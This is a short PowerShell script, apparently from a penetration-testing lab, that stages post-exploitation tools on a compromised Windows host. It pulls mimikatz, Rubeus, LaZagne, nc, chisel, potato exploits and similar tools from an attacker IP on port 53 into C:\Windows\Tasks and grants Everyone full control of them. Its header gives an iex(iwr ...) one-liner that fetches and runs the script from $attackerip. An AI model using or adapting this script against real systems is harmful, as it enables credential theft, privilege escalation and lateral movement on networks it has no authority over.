<#
.SYNOPSIS
	Downloads files from your machine in one swift go, rids permission issues if you move laterally

.EXAMPLE
	iex(iwr -uri $attackerip:$port/transfer_files.ps1 -usebasicparsing)

.IMPORTANT
	MAKE SURE TO ADJUST $baseUrl TO YOUR IP AND PORT (OR YOUR PIVOT'S) !!!
#>

$baseUrl = "http://192.168.45.204:53/"
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "Rubeus.exe", "SharpHound.ps1", "mimikatz.exe", "winpeas.exe", "PrintSpoofer64.exe", "PsLoggedOn.exe", "kerbrute.exe", "agent.exe", "Invoke-RunasCs.ps1", "GodPotato-NET2.exe", "SweetPotato.exe", "Invoke-SweetPotato.ps1", "GodPotato-NET4.exe", "LaZagne.exe", "nc.exe", "chisel.exe", "accesschk.exe", "SharpUp.exe", "Snaffler.exe", "Seatbelt.exe", "jaws.ps1", "EnableAllTokenPrivs.ps1", "powercat.ps1", "PrivescCheck.ps1", "amorous.ps1", "Invoke-SessionGopher.ps1", "titty.ps1", "PowerUpSQL.ps1")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"

	# Set the file permission to Full control for Everyone
	#icacls $filePath /grant Everyone:F
}
icacls *.exe /grant Everyone:F
icacls *.ps1 /grant Everyone:F
